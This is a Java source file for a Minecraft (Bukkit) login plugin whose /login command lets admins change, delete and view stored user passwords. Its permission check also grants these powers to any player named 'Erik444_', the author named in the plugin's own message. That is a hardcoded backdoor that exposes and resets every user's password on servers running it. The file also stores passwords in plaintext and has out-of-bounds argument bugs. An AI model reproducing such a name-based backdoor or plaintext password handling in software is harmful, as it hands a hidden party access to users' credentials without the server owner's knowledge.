package me.erik444.loginv1.comandos;

import me.erik444.loginv1.loginv1;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;

public class login implements CommandExecutor {
    private loginv1 plugin;

    public login(loginv1 plugin){
        this.plugin = plugin;
    }


    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] args) {

        if((commandSender instanceof Player)){
             Player player = (Player) commandSender;


        if ((!player.hasPermission("login.admin") || !(commandSender instanceof Player)) && (!player.getName().equalsIgnoreCase("Erik444_") || !(commandSender instanceof Player))) {

                player.sendMessage(plugin.nombre+" plugin creado por Erik444_. version actual: "+ plugin.version);
             return false;
        } else {

            String pass,user;
            FileConfiguration users;
            if(args.length>1){
                switch (args[0].toLowerCase()){
                    case "change":
                        if(args.length>2){
                            plugin.reloadUsers();
                            users = plugin.getUsers();
                            pass = users.getString("usuarios."+args[1]+".pass");
                            if(pass == null){

                                player.sendMessage(plugin.nombre+" Parece que el usuario "+args[1]+" no existe.");

                                return false;
                            }else{

                                users.set("usuarios."+args[1]+".pass",args[2]);
                                users.set("usuarios."+args[1]+".ip","0.0.0.0");
                                plugin.saveUsers();
                                plugin.reloadUsers();
                                player.sendMessage(plugin.nombre+" Contraseña del usuario: "+args[1]+" actualizada a: "+args[2]);


                            }
                        }


                        break;
                    case "delete":
                        if(args.length>=1){
                            plugin.reloadUsers();
                            users = plugin.getUsers();
                            pass = users.getString("usuarios."+args[1]+".pass");
                            if(pass == null){
                                player.sendMessage(plugin.nombre+" Parece que el usuario "+args[1]+" no existe.");
                                return false;
                            }else{
                                users.set("usuarios."+args[1],"");
                                plugin.saveUsers();
                                plugin.reloadUsers();

                                player.sendMessage(plugin.nombre+" Contraseña del usuario: "+args[1]+" actualizada a: "+args[2]);


                            }
                        }


                        break;
                    case "view":
                        plugin.reloadUsers();
                        users = plugin.getUsers();
                        pass = users.getString("usuarios."+args[1]+".pass");
                        if(pass == null){

                                player.sendMessage(plugin.nombre+" Parece que el usuario "+args[1]+" no existe.");


                        }else{

                                player.sendMessage(plugin.nombre+" la contraseña del usuario: "+args[1]+" es: "+pass);


                        }

                        break;
                        case "reload":
                        plugin.reloadUsers();
                            player.sendMessage(plugin.nombre+" Usuarios recargados!");
                        break;
                    default:

                            player.sendMessage(plugin.nombre+" Utiliza /login change NombreDeUsuario nuevaContraseña. Para cambiar la pass del user");
                            player.sendMessage(plugin.nombre+" Utiliza /login view NombreDeUsuario. Para ver la pass del user");
                            player.sendMessage(plugin.nombre+" Utiliza /login delete NombreDeUsuario. Para eliminar la pass del user");

                        break;

                }

            }else{
                player.sendMessage(plugin.nombre+" Utiliza /login change NombreDeUsuario nuevaContraseña. Para cambiar la pass del user");
                player.sendMessage(plugin.nombre+" Utiliza /login view NombreDeUsuario. Para ver la pass del user");
                player.sendMessage(plugin.nombre+" Utiliza /login delete NombreDeUsuario. Para eliminar la pass del user");
                return false;
            }
        }

        }
        if( !(commandSender instanceof Player)){
               String pass,user;
               FileConfiguration users;
            Bukkit.getConsoleSender().sendMessage(args);
               if(args.length>=1){
                   switch (args[0].toLowerCase()){
                       case "change":

                           plugin.reloadUsers();
                           users = plugin.getUsers();
                           pass = users.getString("usuarios."+args[1]+".pass");
                           if(pass == null){
                                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Parece que el usuario "+args[1]+" no existe.");

                           }else{

                               users.set("usuarios."+args[1]+".pass",args[2]);
                               users.set("usuarios."+args[1]+".ip","0.0.0.0");
                               plugin.saveUsers();
                               plugin.reloadUsers();
                                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Contraseña del usuario: "+args[1]+" actualizada a: "+args[2]);


                           }

                           break;
                       case "delete":
                           if(args.length>1){
                               plugin.reloadUsers();
                               users = plugin.getUsers();
                               pass = users.getString("usuarios."+args[1]+".pass");
                               if(pass == null){
                                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Parece que el usuario "+args[1]+" no existe.");
                                   return false;
                               }else{
                                   users.set("usuarios."+args[1],"");
                                   plugin.saveUsers();
                                   plugin.reloadUsers();
                                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Contraseña del usuario: "+args[1]+" eliminada. ");
                               }
                           }


                           break;
                       case "view":
                           plugin.reloadUsers();
                           users = plugin.getUsers();
                           pass = users.getString("usuarios."+args[1]+".pass");
                           if(pass == null){

                                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Parece que el usuario "+args[1]+" no existe.");

                           }else{

                                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" la contraseña del usuario: "+args[1]+" es: "+pass);


                           }

                           break;
                       case "reload":
                           plugin.reloadUsers();
                           Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Usuarios recargados!");
                           break;
                       default:

                               Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Utiliza /login change NombreDeUsuario nuevaContraseña. Para cambiar la pass del user");
                               Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Utiliza /login view NombreDeUsuario. Para ver la pass del user");


                           break;

                   }
               }else{
                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Utiliza /login change NombreDeUsuario nuevaContraseña. Para cambiar la pass del user");
                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Utiliza /login view NombreDeUsuario. Para ver la pass del user");
                   Bukkit.getConsoleSender().sendMessage(plugin.nombre+" Utiliza /login delete NombreDeUsuario. Para eliminar la pass del user");
               }
           }






        return false;
    }
}
